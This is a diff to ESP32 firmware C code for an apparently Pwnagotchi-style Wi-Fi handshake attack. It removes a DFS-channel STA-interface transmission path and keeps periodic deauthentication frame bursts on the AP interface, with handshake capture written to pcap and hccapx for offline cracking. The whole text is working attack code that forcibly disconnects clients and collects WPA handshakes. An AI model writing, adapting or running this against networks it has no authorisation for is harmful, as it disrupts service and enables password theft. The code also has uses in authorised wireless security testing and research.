@@ -28,7 +28,6 @@
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
 #include "sniffer.h"
-#include "handshake_radio_policy.h"
 
 #include <stdio.h>
 #include <time.h>
@@ -68,12 +67,6 @@ static bool captured_m4 = false;
 static uint8_t handshake_frame_count = 0;
 static bool captured_beacon = false;
 
-// ESP-IDF refuses DFS channels while the AP interface is up, so DFS targets
-// are attacked in STA-only mode and deauth frames go out on the STA interface.
-static wifi_interface_t deauth_tx_if = WIFI_IF_AP;
-static bool deauth_tx_available = true;
-static bool dfs_sta_path = false;
-
 // Deauth frame template
 static uint8_t deauth_frame_default[] = {
     0xC0, 0x00,                         // Type/Subtype: Deauthentication
@@ -89,10 +82,6 @@ static uint8_t deauth_frame_default[] = {
  * @brief Sends deauth frame burst for current AP (Pwnagotchi-style)
  */
 static void send_deauth_frame() {
-    if (!deauth_tx_available) {
-        return;
-    }
-
     // Verify we're on the correct channel
     uint8_t current_channel = 0;
     wifi_second_chan_t second_chan;
@@ -126,15 +115,9 @@ static void send_deauth_frame() {
     
     // Send burst of 5 deauth packets (Pwnagotchi-style)
     for (int i = 0; i < 5; i++) {
-        esp_err_t ret = esp_wifi_80211_tx(deauth_tx_if, deauth_frame, sizeof(deauth_frame), false);
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         if (ret != ESP_OK) {
             ESP_LOGE(TAG, "Failed to send deauth frame #%d: %s", i+1, esp_err_to_name(ret));
-            if (dfs_sta_path) {
-                deauth_tx_available = false;
-                ESP_LOGW(TAG,
-                         "DFS STA injection unavailable; continuing passive handshake capture");
-                break;
-            }
         }
         // Small delay between packets in burst (10ms)
         vTaskDelay(pdMS_TO_TICKS(10));
@@ -374,25 +357,14 @@ esp_err_t attack_handshake_start(const wifi_ap_record_t *ap_record, attack_hands
                            (mode == WIFI_MODE_APSTA) ? "APSTA" : "UNKNOWN";
     ESP_LOGI(TAG, "Current WiFi mode: %s", mode_str);
     
-    handshake_radio_path_t radio_path =
-        handshake_radio_path_for_channel(ap_record->primary);
-    dfs_sta_path = radio_path == HANDSHAKE_RADIO_PATH_STA_TX_STA;
-    deauth_tx_if = dfs_sta_path ? WIFI_IF_STA : WIFI_IF_AP;
-    deauth_tx_available = true;
-
-    bool mode_matches = dfs_sta_path
-        ? mode == WIFI_MODE_STA
-        : mode == WIFI_MODE_APSTA;
-    if (!mode_matches) {
-        ESP_LOGE(TAG, "Radio path mode mismatch: channel=%u mode=%s expected=%s",
-                 ap_record->primary, mode_str,
-                 dfs_sta_path ? "STA" : "APSTA");
+    if (mode != WIFI_MODE_APSTA) {
+        ESP_LOGE(TAG, "Radio path mode mismatch: channel=%u mode=%s expected=APSTA",
+                 ap_record->primary, mode_str);
         return ESP_ERR_INVALID_STATE;
     }
 
-    ESP_LOGI(TAG, "Handshake radio path: %s channel=%u tx_if=%s",
-             dfs_sta_path ? "dfs_sta" : "legacy_apsta",
-             ap_record->primary, dfs_sta_path ? "STA" : "AP");
+    ESP_LOGI(TAG, "Handshake radio path: apsta channel=%u tx_if=AP",
+             ap_record->primary);
 
     // Set and verify the channel before allocating capture state.
     ESP_LOGI(TAG, "Setting channel to %d", ap_record->primary);
@@ -460,26 +432,23 @@ esp_err_t attack_handshake_start(const wifi_ap_record_t *ap_record, attack_hands
             // Send first deauth burst immediately
             send_deauth_frame();
             
-            if (deauth_tx_available) {
-                // Create periodic timer for deauth bursts (every 1 second).
-                const esp_timer_create_args_t deauth_timer_args = {
-                    .callback = &deauth_timer_callback,
-                    .arg = NULL,
-                    .name = "deauth_timer"
-                };
-                err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
-                if (err == ESP_OK) {
-                    err = esp_timer_start_periodic(deauth_timer_handle, 1000000);
-                }
-                if (err != ESP_OK) {
-                    ESP_LOGW(TAG,
-                             "Deauth timer unavailable (%s); continuing passive capture",
-                             esp_err_to_name(err));
-                    if (deauth_timer_handle != NULL) {
-                        esp_timer_delete(deauth_timer_handle);
-                        deauth_timer_handle = NULL;
-                    }
-                    deauth_tx_available = false;
+            // Create periodic timer for deauth bursts (every 1 second).
+            const esp_timer_create_args_t deauth_timer_args = {
+                .callback = &deauth_timer_callback,
+                .arg = NULL,
+                .name = "deauth_timer"
+            };
+            err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
+            if (err == ESP_OK) {
+                err = esp_timer_start_periodic(deauth_timer_handle, 1000000);
+            }
+            if (err != ESP_OK) {
+                ESP_LOGW(TAG,
+                         "Deauth timer unavailable (%s); continuing passive capture",
+                         esp_err_to_name(err));
+                if (deauth_timer_handle != NULL) {
+                    esp_timer_delete(deauth_timer_handle);
+                    deauth_timer_handle = NULL;
                 }
             }
             break;
@@ -541,10 +510,6 @@ void attack_handshake_stop(){
     // Stop sniffer
     esp_wifi_set_promiscuous(false);
 
-    deauth_tx_if = WIFI_IF_AP;
-    deauth_tx_available = true;
-    dfs_sta_path = false;
-    
     method = -1;
     attack_running = false;
     
